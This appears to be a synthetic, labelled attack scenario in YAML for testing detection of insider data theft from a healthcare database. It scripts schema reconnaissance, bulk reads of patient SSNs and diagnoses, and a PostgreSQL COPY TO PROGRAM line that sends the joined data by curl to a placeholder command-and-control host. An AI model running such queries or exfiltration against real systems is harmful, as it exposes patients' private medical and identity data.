@@ -1,0 +1,37 @@
+scenario_id: healthcare_lateral_move_0016
+family_id: healthcare_lateral_move_0016
+domain: healthcare
+time_of_day: 02:30
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+- session_label: recon
+  role: nurse
+  class: malicious
+  anchor: db
+  timing:
+    tempo: steady
+    step_gaps_seconds:
+    - 2.4325746838507305
+  events:
+  - sql: SELECT table_name, column_name FROM information_schema.columns WHERE table_schema = 'public'
+  - sql: SELECT record_id, diagnosis_code, diagnosis_notes, patient_id FROM medical_records WHERE recorded_at > NOW() - INTERVAL '30 days'
+  - step_id: probe
+    sql: COPY (SELECT 'probe') TO PROGRAM 'cat > /dev/null'
+- session_label: harvest
+  role: nurse
+  class: malicious
+  anchor: db
+  delay_after_previous_seconds: 51.034537074234855
+  timing:
+    tempo: bursty
+    step_gaps_seconds:
+    - 1.7313535816777053
+  events:
+  - sql: SELECT ssn, address, date_of_birth, full_name FROM patients
+  - sql: SELECT record_id, diagnosis_code, diagnosis_notes, patient_id FROM medical_records WHERE recorded_at > NOW() - INTERVAL '30 days'
+  - step_id: exfil
+    sql: COPY (SELECT p.ssn, p.address, m.diagnosis_notes FROM patients p JOIN medical_records m ON m.patient_id = p.patient_id) TO PROGRAM 'curl -sX POST https://c2.example.net/harvest -d @-'
+    connects_to:
+      ip: 91.219.236.174
+      port: 443
